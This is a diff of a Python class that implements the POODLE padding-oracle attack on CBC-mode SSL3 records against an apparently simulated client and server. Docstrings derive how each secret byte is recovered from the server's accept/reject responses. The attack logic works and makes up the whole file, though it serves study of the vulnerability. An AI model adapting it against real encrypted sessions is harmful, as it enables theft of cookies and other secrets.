@@ -2,104 +2,96 @@ from constants import *
 
 
 class Attacker:
+    """A POODLE man-in-the-middle.
+
+    Capabilities (all realistic for the attack):
+      * It can make the client send requests with attacker-chosen prefix/suffix
+        lengths (modelling injected JavaScript), but it never sees the secret.
+      * It sees the ciphertext of each request on the wire.
+      * It can tamper with a record and submit it to the server.
+      * It observes ONLY the server's accept/reject bit — never any plaintext.
+
+    From that single bit it recovers the secret one byte at a time, using the
+    classic POODLE block-substitution trick. There is no leaked byte and no
+    nibble ambiguity: every recovered byte is exact.
+    """
+
+    MAX_ATTEMPTS_PER_BYTE = 100_000
+
     def __init__(self, client):
         self.client = client
 
-    def extract_byte(self, secret_byte_index, oracle_func):
+    @staticmethod
+    def _blocks(iv, ciphertext):
+        # blocks[0] = IV, blocks[1] = C0, blocks[2] = C1, ...
+        return [iv] + [ciphertext[k:k + BLOCK_SIZE]
+                       for k in range(0, len(ciphertext), BLOCK_SIZE)]
+
+    def extract_byte(self, i, oracle_func):
+        """Recover secret[i] exactly, using only the accept/reject oracle.
+
+        Framing: choose prefix_len so secret[i] sits at offset 15 of ciphertext
+        block 0, and suffix_len so the record is block-aligned. The record then
+        looks like:  [ data blocks ... ][ MAC block ][ full padding block ].
+
+        Each attempt (with a fresh IV, so every block is randomised):
+          1. Capture the ciphertext. C_target = block 0 holds secret[i] at
+             offset 15; its CBC predecessor is the IV.
+          2. Forge a record by replacing the final padding block with C_target.
+             The block now in front of C_target is the MAC block, C_mac.
+          3. Ask the oracle. The server decrypts the last block as
+                 P = AES_decrypt(C_target) XOR C_mac
+             and accepts iff P[15] == BLOCK_SIZE-1 (the whole block reads as
+             padding, so data||MAC is left intact and the MAC verifies).
+
+        On acceptance:
+             AES_decrypt(C_target)[15] XOR C_mac[15] == 15
+          => AES_decrypt(C_target)[15] == 15 XOR C_mac[15]
+        and from the original (un-forged) chaining of block 0:
+             secret[i] == AES_decrypt(C_target)[15] XOR IV[15]
+          => secret[i] == 15 XOR C_mac[15] XOR IV[15]
+        Every term on the right is known from the captured ciphertext, so the
+        byte is recovered exactly. Acceptance is a 1-in-256 event, so each byte
+        costs ~256 oracle requests on average.
         """
-        Recover secret[secret_byte_index] using a two-phase oracle strategy.
+        secret_len = len(self.client.secret)
+        prefix_len = (BLOCK_SIZE - 1 - i) % BLOCK_SIZE
+        suffix_len = (-(prefix_len + secret_len)) % BLOCK_SIZE  # keep record block-aligned
 
-        ── Phase 1: boolean scan (256 queries, no leaked byte used) ──────────
-        SSL3 accepts any last decrypted byte in [0, 15], so exactly 16 of the
-        256 guesses succeed.  All 16 successes share the same upper nibble as
-        D[15] = AES_decrypt(target_block)[15], because XOR with k ∈ [0, 15]
-        only affects the lower 4 bits.
+        for attempt in range(1, self.MAX_ATTEMPTS_PER_BYTE + 1):
+            iv, ct = self.client.attack_request(prefix_len, suffix_len)
+            blocks = self._blocks(iv, ct)
 
-        This uniquely determines the upper nibble of the secret byte but leaves
-        16 possibilities for the lower nibble — a fundamental limitation of the
-        SSL3 boolean oracle.  No amount of re-querying with different C_prev
-        values resolves this: the candidate set always equals
-            { (secret[i] >> 4) * 16 + m  :  m = 0..15 }
-        regardless of which C_prev is used (the C_prev terms cancel in XOR).
+            c_target = blocks[1]        # C0: secret[i] at offset 15
+            iv_block = blocks[0]        # CBC predecessor of C0 in the real record
+            c_mac = blocks[-2]          # block in front of the padding block
 
-        ── Phase 2: targeted disambiguation (≤16 queries, uses leaked byte) ──
-        For each candidate c, query with guess = c XOR prev[15].  This forces
-        the decrypted last byte to 0 if and only if c is the correct plaintext:
+            forged = ct[:-BLOCK_SIZE] + c_target
+            if oracle_func(iv, forged):
+                d15 = (BLOCK_SIZE - 1) ^ c_mac[15]
+                return d15 ^ iv_block[15], attempt
 
-            decrypted_last = D[15] XOR guess
-                           = (secret[i] XOR prev[15]) XOR (c XOR prev[15])
-                           = secret[i] XOR c
-                           = 0  iff  c == secret[i]
-
-        The oracle returns the leaked decrypted last byte; the candidate that
-        makes it 0 is the exact secret byte.
-
-        In a real POODLE scenario the "leaked byte" is analogous to information
-        present in the server's detailed error response or a timing side channel.
-        A fully blind oracle would require domain knowledge (e.g. known cookie
-        charset) to disambiguate the 16 remaining candidates.
-        """
-        i = secret_byte_index
-        prefix_len = (15 - i) % 16
-        ciphertext  = self.client.encrypt_with_prefix_len(prefix_len)
-        target_block = ciphertext[:BLOCK_SIZE]
-        prev_block   = self.client.IV
-
-        # ── Phase 1: boolean scan → upper nibble of secret[i] ──────────────
-        successes = []
-        for guess in range(256):
-            mp = bytearray(prev_block)
-            mp[15] = guess
-            ok, _ = oracle_func(bytes(target_block), bytes(mp), None)
-            if ok:
-                successes.append(guess)
-
-        if len(successes) != 16:
-            return None
-
-        D15_upper = successes[0] & 0xF0          # shared upper nibble of D[15]
-        candidates = [(D15_upper | dl) ^ prev_block[15] for dl in range(16)]
-
-        # ── Phase 2: targeted calls → isolate the correct lower nibble ──────
-        for c in candidates:
-            targeted_guess = c ^ prev_block[15]  # forces decrypted_last = 0 iff c correct
-            mp = bytearray(prev_block)
-            mp[15] = targeted_guess
-            ok, decrypted_last = oracle_func(bytes(target_block), bytes(mp), None)
-            if ok and decrypted_last == 0:
-                return c
-
-        return None
+        return None, self.MAX_ATTEMPTS_PER_BYTE
 
     def poodle_attack(self, oracle_func, secret_length):
-        """
-        Full POODLE attack: recover every byte of the secret one at a time.
-        Uses boolean oracle only — no leaked decrypted value.
-        """
+        """Recover the whole secret, byte by byte, from the boolean oracle."""
         extracted = bytearray(secret_length)
-        print(f"\n[POODLE] Starting attack — recovering {secret_length} byte(s)...")
+        total = 0
+        print(f"\n[POODLE] Starting attack — recovering {secret_length} byte(s) "
+              f"from an accept/reject oracle only...")
 
         for i in range(secret_length - 1, -1, -1):
-            byte_val = self.extract_byte(i, oracle_func)
-
+            byte_val, attempts = self.extract_byte(i, oracle_func)
+            total += attempts
             if byte_val is not None:
                 extracted[i] = byte_val
                 printable = chr(byte_val) if 0x20 <= byte_val <= 0x7e else '?'
-                print(f"[POODLE] secret[{i}] = {printable!r}  (0x{byte_val:02x})")
+                print(f"[POODLE] secret[{i}] = {printable!r}  (0x{byte_val:02x})  "
+                      f"after {attempts} oracle request(s)")
             else:
                 print(f"[POODLE] secret[{i}]: FAILED to recover")
 
+        print(f"[POODLE] Total oracle requests: {total}")
         result = bytes(extracted)
         print(f"[POODLE] Recovered secret: {result}")
         return result
-
-    def _analyze_ciphertext(self, ciphertext):
-        """Helper to display the block structure of an intercepted ciphertext."""
-        total_length = len(ciphertext)
-        num_blocks = total_length // BLOCK_SIZE
-        print(f"INFO: MITM_attacker - total ciphertext length: {total_length} bytes")
-        print(f"INFO: MITM_attacker - Number of blocks: {num_blocks}")
-        for i in range(num_blocks):
-            start = i * BLOCK_SIZE
-            block = ciphertext[start:start + BLOCK_SIZE]
-            print(f"INFO: MITM_attacker - Block {i}: {len(block)} bytes - {block.hex()}")
